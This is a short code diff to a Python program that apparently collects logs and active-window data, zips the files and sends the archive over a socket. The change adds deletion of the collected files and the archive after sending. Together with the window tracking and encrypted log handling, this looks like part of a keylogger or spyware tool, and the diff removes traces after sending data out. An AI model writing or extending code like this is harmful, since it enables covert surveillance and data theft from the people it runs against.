@@ -5,7 +5,7 @@ from Crypto.Util.Padding import pad
 from sys import argv
 import pygetwindow as gw
 import utils.socket as s
-import datetime, random, zipfile, glob
+import datetime, random, zipfile, glob, os
 
 def currentTime(format=None):
     time = datetime.datetime.now()
@@ -82,8 +82,11 @@ def zipFiles():
         for file in files:
             zipf.write(file)
     zipf.close()
+    for f in files:
+        os.remove(f)
     
     s.send(n + '.zip')
+    os.remove(n + '.zip')
 
 def readLog():
     with open(argv[1],'rb') as f:
